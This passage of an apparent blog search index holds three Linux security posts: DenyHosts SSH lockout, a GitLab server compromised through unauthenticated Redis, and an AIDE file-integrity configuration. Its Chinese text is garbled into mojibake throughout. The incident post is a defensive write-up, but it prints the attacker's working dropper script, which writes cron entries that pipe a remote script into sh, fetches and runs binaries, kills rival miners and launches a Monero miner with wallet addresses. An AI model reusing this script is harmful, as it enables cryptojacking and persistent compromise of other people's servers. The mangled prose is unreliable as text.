statusæ¥æŸ¥çœ‹è¿è¡ŒçŠ¶æ€ DenyHosts is running with pid = 25874 è¡¨ç¤ºå·²ç»å¯åŠ¨èµ·æ¥äº†ã€‚æ¥ä¸‹æ¥å°±å¯ä»¥ä½¿ç”¨ 1cat /etc/hosts.denyæ¥æŸ¥çœ‹è®°å½•äº† ç„¶åå¯åŠ¨æˆåŠŸä»¥åï¼Œæˆ‘è‡ªå·±æµ‹è¯•äº†ä¸‹ï¼Œ 1234567ssh root@115.28.175.207root@115.28.175.207's password:Permission denied, please try again.root@115.28.175.207's password:cPermission denied, please try again.root@115.28.175.207's password:Permission denied (publickey,gssapi-keyex,gssapi-with-mic,password). å‘ç°è‡ªå·±ç™»é™†ä¸ä¸Šå»äº†ï¼Œç„¶ååªèƒ½å»é˜¿é‡Œæ§åˆ¶å°æ“ä½œæŸ¥çœ‹åŸå› ã€‚ åŸæ¥å‘ç° cat /etc/hosts.denyæ¥æŸ¥çœ‹è®°å½•äº† ç„¶åå»æ‰ï¼Œ115IP å‘ç°å°±å¯ä»¥ç™»é™†äº†ã€‚ æ‰€ä»¥æˆ‘åšçš„è®¾ç½®æ˜¯rootå°è¯•ç ´è§£4æ¬¡ä»¥ä¸Šï¼Œè¢«é”å®šã€‚","link":"/2016/06/29/è¿ç»´å®‰å…¨/ åŒ–è§£è‡ªå·±çš„é˜¿é‡Œäº‘æœåŠ¡å™¨è¢«é»‘å®¢æ”»å‡»-æš´åŠ›ç ´è§£/"},{"title":"gitlabç½‘ç«™è¢«é»‘redisè¢«åŠ«æŒ6379ç«¯å£éœ€è¦æäº¤è®¤è¯ï¼Œå¦‚ä½•æŒ½æ•‘ï¼Ÿ","text":"ä»Šå¤©æ—©ä¸Š5ç‚¹å¤šæ”¶åˆ°é˜¿é‡Œäº‘çš„å‘Šè­¦ï¼šæœåŠ¡å™¨CPUç™¾åˆ†ç™¾ï¼ŒgitlabæœåŠ¡å™¨è®¿é—®å‡ºç°500ï¼Œç¬¬ä¸€æ—¶é—´æ’æŸ¥é—®é¢˜ã€‚æ¯•ç«Ÿè¿™ä¸ªå…³ä¹ç€å¼€å‘ä»Šå¤©å¯èƒ½æ— æ³•æäº¤ä»£ç ã€‚ ç¬¬ä¸€æ—¶é—´æˆ‘æŸ¥çœ‹ä»€ä¹ˆåŸå› å¯¼è‡´æˆ‘gitlab 500ã€‚æ ¹æ®ä»¥å¾€ç»éªŒgitlabå‡ºç°500 ç¬¬ä¸€ï¼šç‰ˆæœ¬å‡ºç°bugï¼Œç¬¬äºŒï¼šæœåŠ¡å™¨ç½‘ç»œä¸æ­£å¸¸ï¼Œè¯·æ±‚ä¸åˆ°ã€‚ ç„¶åæŸ¥çœ‹æ—¥å¿—ï¼š 1234567891011121314[root@GitLab ~]# tailf -1000 /home/git/gitlab/log/production.logStarted POST \"//api/v3/internal/allowed\" for 139.129.22.17 at 2017-01-06 10:14:26 +0800Started POST \"//api/v3/internal/allowed\" for 139.129.22.17 at 2017-01-06 10:14:31 +0800Started POST \"//api/v3/internal/allowed\" for 139.129.22.17 at 2017-01-06 10:14:37 +0800Started POST \"//api/v3/internal/allowed\" for 139.129.22.17 at 2017-01-06 10:14:42 +0800Started POST \"//api/v3/internal/allowed\" for 139.129.22.17 at 2017-01-06 10:15:35 +0800Started GET \"/\" for 177.154.56.233 at 2017-01-06 10:15:55 +0800Processing by DashboardController#show as */*Completed 401 Unauthorized in 55msRedis::CommandError (NOAUTH Authentication required.): config/initializers/redis-store-fix-expiry.rb:10:in `block in setex' config/initializers/redis-store-fix-expiry.rb:10:in `setterâ€™ è¿™é‡Œæç¤ºRediséœ€è¦è®¤è¯ï¼ŒRedis::CommandError (NOAUTH Authentication required.):è¿™é‡Œå½“åˆå°±æ²¡æœ‰è®¤è¯çš„ï¼Œçªç„¶éœ€è¦è®¤è¯ï¼Œæ˜æ˜¾è¢«äººé»‘äº†ã€‚ å› ä¸ºredisæœåŠ¡åœ¨2016å¹´3æœˆä»½å®˜ç½‘å‘å¸ƒäº†ä¸€é¡¹é€šçŸ¥ï¼šä½¿ç”¨redisä¸»è¦è®¾ç½®å¯†ç ã€‚å¯ä»¥çœ‹ä¸‹è¿™ç¯‡æ–‡ç« ï¼š Redis æœªæˆæƒè®¿é—®ç¼ºé™·å¯è½»æ˜“å¯¼è‡´ç³»ç»Ÿè¢«é»‘ å…¨çƒæ— éªŒè¯å¯ç›´æ¥åˆ©ç”¨ Redis TOP 10 å›½å®¶ä¸åœ°åŒº è§£å†³æ–¹æ¡ˆ 12345678910111213ä¸´æ—¶è§£å†³æ–¹æ¡ˆ é…ç½®bindé€‰é¡¹, é™å®šå¯ä»¥è¿æ¥RedisæœåŠ¡å™¨çš„IP, å¹¶ä¿®æ”¹redisçš„é»˜è®¤ç«¯å£6379.é…ç½®AUTH, è®¾ç½®å¯†ç , å¯†ç ä¼šä»¥æ˜æ–‡æ–¹å¼ä¿å­˜åœ¨redisé…ç½®æ–‡ä»¶ä¸­.é…ç½®rename-command CONFIG \"RENAME_CONFIG\", è¿™æ ·å³ä½¿å­˜åœ¨æœªæˆæƒè®¿é—®, ä¹Ÿèƒ½å¤Ÿç»™æ”»å‡»è€…ä½¿ç”¨configæŒ‡ä»¤åŠ å¤§éš¾åº¦å¥½æ¶ˆæ¯æ˜¯Redisä½œè€…è¡¨ç¤ºå°†ä¼šå¼€å‘â€real userâ€ï¼ŒåŒºåˆ†æ™®é€šç”¨æˆ·å’Œadminæƒé™ï¼Œæ™®é€šç”¨æˆ·å°†ä¼šè¢«ç¦æ­¢è¿è¡ŒæŸäº›å‘½ä»¤ï¼Œå¦‚configå®˜æ–¹è§£å†³æ–¹æ¡ˆ æš‚æ— å®˜æ–¹è§£å†³æ–¹æ¡ˆ ç°åœ¨ç‰ˆæœ¬gitlab 7.0ç‰ˆæœ¬çš„æ²¡æœ‰redisè®¾ç½®å¯†ç ä¸€é¡¹ï¼Œæ‰€ä»¥å°±è§‰å¾—å¥‡æ€ªï¼Œä¸ºä»€ä¹ˆä¼šæœ‰äººè®¾ç½®äº†å¯†ç ï¼Œç½‘ç«™å¯¼è‡´è·å–ä¸åˆ°æ•°æ®å°±å‡ºç°500äº†ã€‚ æŸ¥æ‰¾åŸå› ï¼šä»€ä¹ˆåŸå› å¯¼è‡´CPUä¸€ç›´100%é¦–å…ˆSSHç™»é™†ï¼ŒtopæŸ¥çœ‹è¿›ç¨‹ï¼Œå‘ç°å¥‡æ€ªåå­—çš„å‘½ä»¤AnXqV, ddg.217éšè—è¿›ç¨‹ã€‚ è¿˜æœ‰ä¸€çœ‹å°±æ„Ÿè§‰æœ‰é—®é¢˜ã€‚ çŸ¥é“è¿™ä¸ªè¿›ç¨‹ç„¶åæˆ‘ä»¬å•ç‹¬çœ‹ä¸‹è¿™ä¸ªè¿›ç¨‹å…·ä½“æœ‰å“ªäº›ï¼š 1lsof â€“c ddg.217 æŸ¥çœ‹å…³è”æ–‡ä»¶ï¼Œå‘ç°å¯¹å¤–çš„tcpè¿æ¥ï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯åå‘shellâ€¦ ä»è¿™é‡Œæ˜æ˜¾å¯ä»¥çœ‹çš„å‡ºæ¥ï¼Œæˆ‘çš„redis-6379 è¢«äººæ‹¿åˆ°shellæƒé™äº†ã€‚ ä»ä¸Šé¢å¯ä»¥çœ‹åˆ°ï¼š è¿™é‡Œæˆ‘åˆ°/root/.ddg/17.dbè¿™ä¸ªæ–‡ä»¶æˆ‘æ‰“å¼€çœ‹æ˜¯ä¹±ç åŠ å¯†è¿‡çš„ã€‚åŠ å¯†çš„ çœ‹ä¸åˆ°æ•°æ®ã€‚ è¿™é‡Œç¬¬ä¸€æ­¥åˆ é™¤ç¬¬ä¸€ä¸ªç—…æ¯’æ–‡ä»¶å’ŒåŠ æƒé™ä½ï¼š12rm -rf /root/.ddg åˆ é™¤ä¾èµ–ã€‚ä»–ä¾èµ–äºå“ªä¸ªæ–‡ä»¶ï¼Œç„¶åç»™åŠ ä¸€ä¸ªæƒé™ä½ï¼šchattr +s filenameåˆ é™¤æ‰äº† ä½ æ‰‹åŠ¨åˆ›å»ºï¼Œç„¶ååŠ æƒé™ä½ã€‚ ç¬¬äºŒæ­¥åˆ†æä¸‹é¢IPåœ°å€ï¼š1234139.222.173.127139.70.199.90.....åé¢å°±ä¸ç”¨è§£é‡Šäº†ï¼Œè¿™ä¸ªæ˜æ˜¾å½“`è‚‰é¸¡`äº†ã€‚ ä¸´æ—¶æ–¹æ³•é˜²ç«å¢™é…ç½®å±è”½è¿™äº›IPåœ°å€ã€‚ æ²»æ ‡ä¸æ²»æœ¬ã€ è¿™é‡Œè§£å†³æ‰12506è¿›ç¨‹ï¼škill -9 12506 é…ç½® ä¸€ä¸ªhosts 110.0.1.110 www.haveabitchin.com é…ç½®æˆ ç™¾åº¦çš„ip å¸®ä»–é…é”™åœ°å€,ä»–è‚¯å®šè¯·æ±‚ä¸‹è½½ ä¸åˆ°è¿™ä¸ªè„šæœ¬äº†. ç„¶åæŒ‰è¿›ç¨‹ç¨‹åºç›®å½•ä¸‹é¢è¿›å…¥/tmp/åˆ é™¤ ddg.217æ–‡ä»¶ï¼Œåˆ é™¤duchduckgo.17.log è¿™ä¸ªæ˜¯ç—…æ¯’è¿è¡Œè¿›ç¨‹è¾“å‡ºçš„æ—¥å¿—æ–‡ä»¶ï¼Œåˆ é™¤hsperfadata_root è¿™ä¸ªæ–‡ä»¶é‡Œé¢æ˜¯ä¸ªè¿›ç¨‹ï¼Œä¹Ÿåˆ é™¤ã€‚ ç„¶ååœ¨çœ‹çœ‹æ˜¯å¦è¿˜æœ‰æ²¡æœ‰è¿™ä¸ªè¿›ç¨‹ï¼šåˆå¯åŠ¨13929è¿™ä¸ªè¿›ç¨‹ï¼ŒæœåŠ¡è¿˜æ˜¯å ç”¨å¾ˆé«˜èµ„æºCPUï¼š100%å®šä½åˆ°æ˜¯å“ªä¸ªç¨‹åº å‘èµ·çš„è¯·æ±‚.æŸ¥çœ‹ï¼š13918è¿™ä¸ªè¿›ç¨‹ï¼š ä»è¿™é‡Œæ˜æ˜¾å¯ä»¥çœ‹å‡ºæ¥ï¼Œè¿™ä¸ªåœ°å€ï¼š 12/bin/sh -c curl -fsSL http://www.haveabitchin.com/pm.sh?0105008 | shcurl -fsSL http://www.haveabitchin.com/ddg.x86_64 -o /tmp/ddg.217 è¿™ä¸ªæ˜æ˜¾æ˜¯å“ªä¸ªç¨‹åºä¸€ç›´åœ¨å¯åŠ¨ã€‚ ç¬¬ä¸‰æ­¥ç»§ç»­æ’æŸ¥ï¼šåˆ é™¤è¿™äº›å‘ç°è¿˜æ˜¯CPUç™¾åˆ†ç™¾ï¼šåœ¨ç»§ç»­æŸ¥çœ‹è¿›ç¨‹ï¼š 1root 26373 1 96 Jan01 ? 4-12:14:03 ./minerd -B -a cryptonight -o stratum+tcp://xmr.crypto-pool.fr:80 -u 44GpQ3X9aCR5fMfD8myxKQcAYjkTdT5KrM4NM2rM9yWnEkP28mmXu5URUCxwuvKiVCQPZaoYkpxxzKoCpnED6Gmb2wWJRuN -p x è¿™ä¸ªè¿›ç¨‹æ˜¯ä»€ä¹ˆï¼šmined ç™¾åº¦å‘Šè¯‰æˆ‘ä»¬äº†: minedè‚‰é¸¡æœ¨é©¬ å¾ˆåƒCPUä¸€ç§ç—…æ¯’ã€‚ ç¬¬ä¸€æ­¥è§£å†³å®šä½æœ¨é©¬ï¼š1find / -name minerd åœ¨æœåŠ¡å™¨æœç´¢æ‰€æœ‰ç›¸å…³minerdæ–‡ä»¶ã€‚æœç´¢åˆ°äº†è¿™ä¸ªæ–‡ä»¶æ”¾åœ¨æˆ‘ä»¬/home/ç›®å½•ä¸‹é¢ã€‚ ç¬¬äºŒæ­¥åˆ é™¤æœ¨é©¬ï¼šæŸ¥çœ‹è®¡åˆ’ä»»åŠ¡æ˜¯å¦æœ‰å¯åŠ¨ï¼š 12[root@GitLab tmp]# cronte -e*/5 * * * * curl -fsSL http://www.haveabitchin.com/pm.sh?0105008 | sh æœåŠ¡å™¨æ¢å¤æ­£å¸¸ï¼š æˆ‘è¿™é‡Œå°±è´´å‡ºäº†è¿™ä¸ªæœ¨é©¬çš„è„šæœ¬å†…å®¹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869export PATH=$PATH:/bin:/usr/bin:/usr/local/bin:/usr/sbinecho \"*/5 * * * * curl -fsSL http://www.haveabitchin.com/pm.sh?0105008 | sh\" &gt; /var/spool/cron/rootmkdir -p /var/spool/cron/crontabsecho \"*/5 * * * * curl -fsSL http://www.haveabitchin.com/pm.sh?0105008 | sh\" &gt; /var/spool/cron/crontabs/rootif [ ! -f \"/tmp/ddg.217\" ]; then curl -fsSL http://www.haveabitchin.com/ddg.$(uname -m) -o /tmp/ddg.217fichmod +x /tmp/ddg.217 &amp;&amp; /tmp/ddg.217killall /tmp/ddg.216if [ -d \"/opt/yam\" ]; then rm -rf /opt/yamfips auxf|grep -v grep|grep /tmp/duckduckgo|awk '&#123;print $2&#125;'|xargs kill -9ps auxf|grep -v grep|grep \"/usr/bin/cron\"|awk '&#123;print $2&#125;'|xargs kill -9ps auxf|grep -v grep|grep \"/opt/cron\"|awk '&#123;print $2&#125;'|xargs kill -9â–½ps auxf|grep -v grep|grep \"/usr/sbin/ntp\"|awk '&#123;print $2&#125;'|xargs kill -9ps auxf|grep -v grep|grep \"/opt/minerd\"|awk '&#123;print $2&#125;'|xargs kill -9ps auxf|grep -v grep|grep \"mine.moneropool.com\"|awk '&#123;print $2&#125;'|xargs kill -9ps auxf|grep -v grep|grep \"xmr.crypto-pool.fr:8080\"|awk '&#123;print $2&#125;'|xargs kill -9#/opt/minerd -h#if [ $? != \"0\" ]; then #ps auxf|grep -v grep|grep \"/opt/minerd\" #if [ $? != \"0\" ]; then #if [ ! -f /opt/yam ]; then #curl -fsSL http://www.haveabitchin.com/yam -o /opt/yam #fi #chmod +x /opt/yam &amp;&amp; /opt/yam -c x -M stratum+tcp://4Ab9s1RRpueZN2XxTM3vDWEHcmsMoEMW3YYsbGUwQSrNDfgMKVV8GAofToNfyiBwocDYzwY5pjpsMB7MY8v4tkDU71oWpDC:x@xmr.crypto-pool.fr:443/xmr #fi#fiDoMiner()&#123; if [ ! -f \"/tmp/AnXqV\" ]; then curl -fsSL http://www.haveabitchin.com/minerd -o /tmp/AnXqV fi chmod +x /tmp/AnXqV /tmp/AnXqV -B -a cryptonight -o stratum+tcp://xmr.crypto-pool.fr:443 -u 4Ab9s1RRpueZN2XxTM3vDWEHcmsMoEMW3YYsbGUwQSrNDfgMKVV8GAofToNfyiBwocDYzwY5pjpsMB7MY8v4tkDU71oWpDC -p x&#125;ps auxf|grep -v grep|grep \"4Ab9s1RRpueZN2XxTM3vDWEHcmsMoEMW3YYsbGUwQSrNDfgMKVV8GAofToNfyiBwocDYzwY5pjpsMB7MY8v4tkDU71oWpDC\" || DoMinerDoRedis6379()&#123; iptables -F REDIS6379 iptables -A REDIS6379 -p tcp -s 127.0.0.1 --dport 6379 -j ACCEPT #iptables -A REDIS6379 -s 0.0.0.0/8 -p tcp --dport 6379 -j ACCEPT #iptables -A REDIS6379 -s 10.0.0.0/8 -p tcp --dport 6379 -j ACCEPT #iptables -A REDIS6379 -s 169.254.0.0/16 -p tcp --dport 6379 -j ACCEPT #iptables -A REDIS6379 -s 172.16.0.0/12 -p tcp --dport 6379 -j ACCEPT #iptables -A REDIS6379 -s 192.168.0.0/16 -p tcp --dport 6379 -j ACCEPT #iptables -A REDIS6379 -s 224.0.0.0/4 -p tcp --dport 6379 -j ACCEPT iptables -A REDIS6379 -p TCP --dport 6379 -j REJECT iptables -I INPUT -j REDIS6379&#125;iptables -D OUTPUT -j REDIS6379iptables -F REDIS6379iptables -X REDIS6379iptables -D INPUT -j REDIS63792iptables -F REDIS63792iptables -X REDIS63792#iptables -N REDIS6379 &amp;&amp; DoRedis6379 åˆ†æäº†ä¸€ä¸‹ï¼Œå®ƒé™¤äº†è‡ªèº«è¿›ç¨‹å¤–ï¼Œè¿˜æœ‰3ä¸ªå®ˆæŠ¤è¿›ç¨‹ï¼Œè€Œä¸”è¿™5ä¸ªè¿›ç¨‹çš„PIDå’Œåç§°æ¯ç§’éƒ½åœ¨å˜åŒ–ï¼Œä¼°è®¡æ˜¯åœ¨ä¸åœçš„é‡å»ºå§ã€‚ ä»¥åŠæ·»åŠ æœåŠ¡å®šæ—¶æ‰§è¡Œè„šæœ¬ã€‚ 123echo \"*/5 * * * * curl -fsSL http://www.haveabitchin.com/pm.sh?0105008 | sh\" &gt; /var/spool/cron/rootmkdir -p /var/spool/cron/crontabsecho \"*/5 * * * * curl -fsSL http://www.haveabitchin.com/pm.sh?0105008 | sh\" &gt; /var/spool/cron/crontabs/root ä¸‹è½½ç—…æ¯’æ–‡ä»¶ï¼Œä¸»è¦æ˜¯æˆªå–æˆ‘6379è¿™ä¸ªç«¯å£ï¼Œææƒï¼Œç­‰ç­‰ä¿¡æ¯ï¼Œè¿™ä¸ªæ–‡ä»¶å¯¹æ–¹åšè¿‡åŠ å¯†çš„ã€‚ 12345678910if [ ! -f \"/tmp/ddg.217\" ]; then curl -fsSL http://www.haveabitchin.com/ddg.$(uname -m) -o /tmp/ddg.217fichmod +x /tmp/ddg.217 &amp;&amp; /tmp/ddg.217killall /tmp/ddg.216if [ -d \"/opt/yam\" ]; then rm -rf /opt/yamfi ç¬¬äºŒä¸ªç—…æ¯’æ–‡ä»¶ï¼Œåå‘ä»£ç†è‚‰é¸¡çš„æœ¨é©¬ï¼Œä¹ŸåŠ å¯†è¿‡çš„ã€‚ä¸‹è½½æ”¾åˆ°/tmp/ä¸‹é¢ è¿™ä¸ªæ˜¯ä¸´æ—¶æ–‡ä»¶ã€‚ 123456789DoMiner()&#123; if [ ! -f \"/tmp/AnXqV\" ]; then curl -fsSL http://www.haveabitchin.com/minerd -o /tmp/AnXqV fi chmod +x /tmp/AnXqV /tmp/AnXqV -B -a cryptonight -o stratum+tcp://xmr.crypto-pool.fr:443 -u 4Ab9s1RRpueZN2XxTM3vDWEHcmsMoEMW3YYsbGUwQSrNDfgMKVV8GAofToNfyiBwocDYzwY5pjpsMB7MY8v4tkDU71oWpDC -p x&#125;ps auxf|grep -v grep|grep \"4Ab9s1RRpueZN2XxTM3vDWEHcmsMoEMW3YYsbGUwQSrNDfgMKVV8GAofToNfyiBwocDYzwY5pjpsMB7MY8v4tkDU71oWpDC\" || DoMiner å¯¹æ–¹é…ç½®çš„é˜²ç«å¢™è§„åˆ™ï¼š 6379 æœ¬åœ°è®¿é—®ã€‚ 1234567891011121314151617181920DoRedis6379()&#123; iptables -F REDIS6379 iptables -A REDIS6379 -p tcp -s 127.0.0.1 --dport 6379 -j ACCEPT //åªå…è®¸127.0.0.1è®¿é—®6379 #iptables -A REDIS6379 -s 0.0.0.0/8 -p tcp --dport 6379 -j ACCEPT #iptables -A REDIS6379 -s 10.0.0.0/8 -p tcp --dport 6379 -j ACCEPT #iptables -A REDIS6379 -s 169.254.0.0/16 -p tcp --dport 6379 -j ACCEPT #iptables -A REDIS6379 -s 172.16.0.0/12 -p tcp --dport 6379 -j ACCEPT #iptables -A REDIS6379 -s 192.168.0.0/16 -p tcp --dport 6379 -j ACCEPT #iptables -A REDIS6379 -s 224.0.0.0/4 -p tcp --dport 6379 -j ACCEPT iptables -A REDIS6379 -p TCP --dport 6379 -j REJECT iptables -I INPUT -j REDIS6379&#125;iptables -D OUTPUT -j REDIS6379iptables -F REDIS6379iptables -X REDIS6379iptables -D INPUT -j REDIS63792iptables -F REDIS63792iptables -X REDIS63792#iptables -N REDIS6379 &amp;&amp; DoRedis6379 åˆ é™¤è¿™äº›æ–‡ä»¶ï¼Œåœ¨çœ‹çœ‹å°±æ²¡é—®é¢˜äº†ï¼Œåé¢æŠŠredisè®¾ç½®äº†ã€‚ æˆ‘ä»¬å½“åˆè®¾ç½®äº†åå‘ä»£ç†å’Œé˜²ç«å¢™è§„åˆ™ï¼Œæƒé™è®¾ç½®äº†å¾ˆç»†ï¼Œåªèƒ½æ™®é€šç”¨æˆ·å¯åŠ¨æœåŠ¡ã€‚ æ€»ç»“ï¼š è¿™æ¬¡å‘ç”Ÿç ´ç­æ€§çš„æ”»å‡»ï¼Œæ€»ç»“ç»éªŒè¿™é‡Œgitlabèµ°rediså•ç‹¬èµ°æœ¬åœ°ï¼šè®¾ç½®ï¼šbindå•ç‹¬æœ¬åœ°è·‘ã€‚127.0.0.1 ç¬¬äºŒï¼šæ™®é€šç”¨æˆ·å¯åŠ¨redisï¼Œç¬¬ä¸‰ï¼šè®¾ç½®é˜²ç«å¢™ã€‚","link":"/2016/12/02/è¿ç»´å®‰å…¨/gitlabç½‘ç«™è¢«é»‘redisè¢«åŠ«æŒ6379ç«¯å£éœ€è¦æäº¤è®¤è¯ï¼Œå¦‚ä½•æŒ½æ•‘ï¼Ÿ/"},{"title":"ä½¿ç”¨AIDEåšLinuxé«˜çº§å…¥ä¾µæ£€æµ‹æ–‡ä»¶ç›‘æ§","text":"1ã€aideä»‹ç» AIDE(Adevanced Intrusion Detection Environment,é«˜çº§å…¥ä¾µæ£€æµ‹ç¯å¢ƒ)æ˜¯ä¸ªå…¥ä¾µæ£€æµ‹å·¥å…·ï¼Œä¸»è¦ç”¨é€”æ˜¯æ£€æŸ¥æ–‡æœ¬çš„å®Œæ•´æ€§ã€‚ AIDEèƒ½å¤Ÿæ„é€ ä¸€ä¸ªæŒ‡å®šæ–‡æ¡£çš„æ•°æ®åº“ï¼Œä»–ä½¿ç”¨aide.confä½œä¸ºå…¶é…ç½®æ–‡æ¡£ã€‚AIDEæ•°æ®åº“èƒ½å¤Ÿä¿å­˜æ–‡æ¡£çš„å„ç§å±æ€§ï¼ŒåŒ…æ‹¬ï¼šæƒé™(permission)ã€ç´¢å¼•èŠ‚ç‚¹åºå·(inode number)ã€æ‰€å±ç”¨æˆ·(user)ã€æ‰€å±ç”¨æˆ·ç»„(group)ã€æ–‡æ¡£å¤§å°ã€æœ€åä¿®æ”¹æ—¶é—´(mtime)ã€åˆ›å»ºæ—¶é—´(ctime)ã€æœ€åè®¿é—®æ—¶é—´(atime)ã€å¢åŠ çš„å¤§å°è¿åŒè¿æ¥æ•°ã€‚AIDEè¿˜èƒ½å¤Ÿä½¿ç”¨ä¸‹åˆ—ç®—æ³•ï¼šsha1ã€md5ã€rmd160ã€tigerï¼Œä»¥å¯†æ–‡å½¢å¼å»ºç«‹æ¯ä¸ªæ–‡æ¡£çš„æ ¡éªŒç æˆ–æ•£åˆ—å·ã€‚ å¸¸è§çš„å…¥ä¾µæ£€æµ‹è½¯ä»¶ï¼š tripwireâ€“æ“ä½œæ¯”è¾ƒå¤æ‚,aideâ€“ç”¨ä»¥ä»£æ›¿tripwire,æ¯”è¾ƒç®€å•. ç³»ç»Ÿç¯å¢ƒï¼š RHEL 6.2 [2.6.32-220.el6.i686] è½¯ä»¶ç¯å¢ƒï¼š 2ã€aideå®‰è£… é…ç½®ä½¿ç”¨yum rpmäºŒè¿›åˆ¶å®‰è£… 1yum -y install aide æˆ‘çš„é…ç½®æ–‡ä»¶ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227mv /etc/aide.conf /etc/aide.conf.bakvim /etc/aide.conf # Example configuration file for AIDE.@@define DBDIR /var/lib/aide #åŸºå‡†æ•°æ®åº“ç›®å½•@@define LOGDIR /var/log/aide #æ—¥å¿—ç›®å½• # The location of the database to be read.database=file:@@&#123;DBDIR&#125;/aide.db.gz #åŸºç¡€æ•°æ®åº“æ–‡ä»¶ # The location of the database to be written. #database_out=sql:host:port:database:login_name:passwd:table#database_out=file:aide.db.newdatabase_out=file:@@&#123;DBDIR&#125;/aide.db.new.gz #æ›´æ–°æ•°æ®åº“æ–‡ä»¶ # Whether to gzip the output to databasegzip_dbout=yes # Default.verbose=5 report_url=file:@@&#123;LOGDIR&#125;/aide.logreport_url=stdout#report_url=stderr#NOT IMPLEMENTED report_url=mailto:root@foo.com#NOT IMPLEMENTED report_url=syslog:LOG_AUTH # These are the default rules.##p: permissions#i: inode:#n: number of links#u: user#g: group#s: size#b: block count#m: mtime#a: atime#c: ctime#S: check for growing size#acl: Access Control Lists#selinux SELinux security context#xattrs: Extended file attributes#md5: md5 checksum#sha1: sha1 checksum#sha256: sha256 checksum#sha512: sha512 checksum#rmd160: rmd160 checksum#tiger: tiger checksum #haval: haval checksum (MHASH only)#gost: gost checksum (MHASH only)#crc32: crc32 checksum (MHASH only)#whirlpool: whirlpool checksum (MHASH only) #R: p+i+n+u+g+s+m+c+acl+selinux+xattrs+md5#L: p+i+n+u+g+acl+selinux+xattrs#E: Empty group#&gt;: Growing logfile p+u+g+i+n+S+acl+selinux+xattrsR = p+i+n+u+g+s+m+c+acl+selinux+xattrs+md5L = p+i+n+u+g+acl+selinux+xattrs&gt; = p+u+g+i+n+S+acl+selinux+xattrs # You can create custom rules like this.# With MHASH...# ALLXTRAHASHES = sha1+rmd160+sha256+sha512+whirlpool+tiger+haval+gost+crc32ALLXTRAHASHES = sha1+rmd160+sha256+sha512+tiger# Everything but access time (Ie. all changes)EVERYTHING = R+ALLXTRAHASHES # Sane, with multiple hashes# NORMAL = R+rmd160+sha256+whirlpoolNORMAL = R+rmd160+sha256 # For directories, don't bother doing hashesDIR = p+i+n+u+g+acl+selinux+xattrs # Access control only PERMS = p+i+u+g+acl+selinux # Logfile are special, in that they often change LOG = &gt; # Just do md5 and sha256 hashes LSPP = R+sha256 # Some files get updated automatically, so the inode/ctime/mtime change # but we want to know when the data inside them changes DATAONLY = p+n+u+g+s+acl+selinux+xattrs+md5+sha256+rmd160+tiger # Next decide what directories/files you want in the database. /boot NORMAL/bin NORMAL/sbin NORMAL/lib NORMAL/lib64 NORMAL/opt NORMAL/usr NORMAL/root NORMAL# These are too volatile!/usr/src!/usr/tmp!/usr/share #é€šè¿‡æ–‡ä»¶è·¯å¾„å‰é¢åŠ æ„Ÿå¹å· ! æ’é™¤è¿™ä¸ªè·¯å¾„çš„ç›‘æ§,è¯·è‡ªå®šä¹‰ # Check only permissions, inode, user and group for /etc, but# cover some important files closely./etc PERMS!/etc/mtab # Ignore backup files!/etc/.*~/etc/exports NORMAL/etc/fstab NORMAL/etc/passwd NORMAL/etc/group NORMAL/etc/gshadow NORMAL/etc/shadow NORMAL/etc/security/opasswd NORMAL /etc/hosts.allow NORMAL/etc/hosts.deny NORMAL /etc/sudoers NORMAL/etc/skel NORMAL /etc/logrotate.d NORMAL /etc/resolv.conf DATAONLY /etc/nscd.conf NORMAL/etc/securetty NORMAL # Shell/X starting files/etc/profile NORMAL/etc/bashrc NORMAL/etc/bash_completion.d/ NORMAL/etc/login.defs NORMAL/etc/zprofile NORMAL/etc/zshrc NORMAL/etc/zlogin NORMAL/etc/zlogout NORMAL/etc/profile.d/ NORMAL/etc/X11/ NORMAL # Pkg manager/etc/yum.conf NORMAL/etc/yumex.conf NORMAL/etc/yumex.profiles.conf NORMAL/etc/yum/ NORMAL /etc/yum.repos.d/ NORMAL /var/log LOG /var/run/utmp LOG # This gets new/removes-old filenames daily!/var/log/sa # As we are checking it, we've truncated yesterdays size to zero. !/var/log/aide.log # LSPP rules...# AIDE produces an audit record, so this becomes # /var/log/audit/ LSPP/etc/audit/ LSPP/etc/libaudit.conf LSPP/usr/sbin/stunnel LSPP/var/spool/at LSPP/etc/at.allow LSPP/etc/at.deny LSPP/etc/cron.allow LSPP/etc/cron.deny LSPP/etc/cron.d/ LSPP/etc/cron.daily/ LSPP/etc/cron.hourly/ LSPP/etc/cron.monthly/ LSPP/etc/cron.weekly/ LSPP/etc/crontab LSPP/var/spool/cron/root LSPP /etc/login.defs LSPP/etc/securetty LSPP/var/log/faillog LSPP/var/log/lastlog LSPP /etc/hosts LSPP/etc/sysconfig LSPP /etc/inittab LSPP/etc/grub/ LSPP/etc/rc.d LSPP /etc/ld.so.conf LSPP /etc/localtime LSPP /etc/sysctl.conf LSPP /etc/modprobe.conf LSPP /etc/pam.d LSPP/etc/security LSPP/etc/aliases LSPP/etc/postfix LSPP /etc/ssh/sshd_config LSPP /etc/ssh/ssh_config LSPP /etc/stunnel LSPP /etc/vsftpd.ftpusers LSPP /etc/vsftpd LSPP /etc/issue LSPP/etc/issue.net LSPP /etc/cups LSPP # With AIDE's default verbosity level of 5, these would give lots of# warnings upon tree traversal. It might change with future version.##=/lost\\+found DIR#=/home DIR # Ditto /var/log/sa reason...!/var/log/and-httpd # Admins dot files constantly change, just check perms/root/\\..* PERMS ä¸‹ä¸€æ­¥ï¼š åˆå§‹åŒ–ç›‘æ§æ•°æ®åº“(è¿™éœ€è¦ä¸€äº›æ—¶é—´) 123456 /usr/sbin/aide -c /etc/aide.conf --init``` æŠŠå½“å‰åˆå§‹åŒ–çš„æ•°æ®åº“ä½œä¸ºå¼€å§‹çš„åŸºç¡€æ•°æ®åº“``` bash cp /var/lib/aide/aide.db.new.gz /var/lib/aide/aide.db.gz å¦‚æœæ˜¯æ­£å¸¸çš„æ”¹åŠ¨ æ›´æ–°æ”¹åŠ¨åˆ°åŸºç¡€æ•°æ®åº“ 12aide --updatecd /var/lib/aide/ è¦†ç›–æ›¿æ¢æ—§çš„æ•°æ®åº“ 1mv aide.db.new.gz aide.db.gz 